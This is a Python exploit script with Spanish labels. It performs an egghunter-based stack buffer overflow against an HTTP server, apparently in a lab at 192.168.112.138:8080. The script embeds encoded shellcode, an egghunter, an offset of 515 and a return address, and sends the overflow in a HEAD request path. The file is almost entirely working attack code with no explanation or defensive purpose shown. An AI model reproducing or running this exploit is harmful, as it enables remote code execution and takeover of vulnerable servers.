#!/usr/bin/python

import socket, sys
from struct import pack

def explotacion():
    shellcode=("\xbe\xfe\x38\x25\x7e\xdb\xd0\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x52\x83\xef\xfc\x31\x77\x0e\x03\x89\x36\xc7\x8b\x89\xaf\x85"
"\x74\x71\x30\xea\xfd\x94\x01\x2a\x99\xdd\x32\x9a\xe9\xb3\xbe"
"\x51\xbf\x27\x34\x17\x68\x48\xfd\x92\x4e\x67\xfe\x8f\xb3\xe6"
"\x7c\xd2\xe7\xc8\xbd\x1d\xfa\x09\xf9\x40\xf7\x5b\x52\x0e\xaa"
"\x4b\xd7\x5a\x77\xe0\xab\x4b\xff\x15\x7b\x6d\x2e\x88\xf7\x34"
"\xf0\x2b\xdb\x4c\xb9\x33\x38\x68\x73\xc8\x8a\x06\x82\x18\xc3"
"\xe7\x29\x65\xeb\x15\x33\xa2\xcc\xc5\x46\xda\x2e\x7b\x51\x19"
"\x4c\xa7\xd4\xb9\xf6\x2c\x4e\x65\x06\xe0\x09\xee\x04\x4d\x5d"
"\xa8\x08\x50\xb2\xc3\x35\xd9\x35\x03\xbc\x99\x11\x87\xe4\x7a"
"\x3b\x9e\x40\x2c\x44\xc0\x2a\x91\xe0\x8b\xc7\xc6\x98\xd6\x8f"
"\x2b\x91\xe8\x4f\x24\xa2\x9b\x7d\xeb\x18\x33\xce\x64\x87\xc4"
"\x31\x5f\x7f\x5a\xcc\x60\x80\x73\x0b\x34\xd0\xeb\xba\x35\xbb"
"\xeb\x43\xe0\x6c\xbb\xeb\x5b\xcd\x6b\x4c\x0c\xa5\x61\x43\x73"
"\xd5\x8a\x89\x1c\x7c\x71\x5a\xe3\x29\x09\x32\x8b\x2b\xe9\x53"
"\x8d\xa5\x0f\x39\x1d\xe0\x98\xd6\x84\xa9\x52\x46\x48\x64\x1f"
"\x48\xc2\x8b\xe0\x07\x23\xe1\xf2\xf0\xc3\xbc\xa8\x57\xdb\x6a"
"\xc4\x34\x4e\xf1\x14\x32\x73\xae\x43\x13\x45\xa7\x01\x89\xfc"
"\x11\x37\x50\x98\x5a\xf3\x8f\x59\x64\xfa\x42\xe5\x42\xec\x9a"
"\xe6\xce\x58\x73\xb1\x98\x36\x35\x6b\x6b\xe0\xef\xc0\x25\x64"
"\x69\x2b\xf6\xf2\x76\x66\x80\x1a\xc6\xdf\xd5\x25\xe7\xb7\xd1"
"\x5e\x15\x28\x1d\xb5\x9d\x58\x54\x97\xb4\xf0\x31\x42\x85\x9c"
"\xc1\xb9\xca\x98\x41\x4b\xb3\x5e\x59\x3e\xb6\x1b\xdd\xd3\xca"
"\x34\x88\xd3\x79\x34\x99")
    
    egg="HACKHACK"
    #!mona egg -t HACK
    egghunter=("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x48\x41\x43\x4b\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
    offset=515
    buffer="A"*(offset-len(egg+shellcode))
    buffer+=egg
    buffer+=shellcode
    #buffer+=pack("<L",0x76bc2d4f)
    buffer+=pack("<L",0x76636c28)
    buffer+="\x90"*10
    buffer+=egghunter
    

    #offset=515
    #buffer="A"*offset
    #buffer+=pack("<L",0x76636c28)
    #buffer+="\x90"*10
    #buffer+=shellcode
    
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.112.138',8080))
        request="HEAD /"+buffer+" HTTP/1.1\r\n"
        request+="Host: 192.168.112.138:8080\r\n"
        request+="User-Agent: kepo\r\n"
        request+="Keep-Alive: 115\r\n"
        request+="Connection: keep-alive\r\n\r\n"
        s.send(request)
        data = s.recv(1024)
        s.close()
    except:
        print("\n[!] Ha ocurrido un error en la conexion\n")
        sys.exit(1)
    
        
    
if __name__=="__main__":
    explotacion()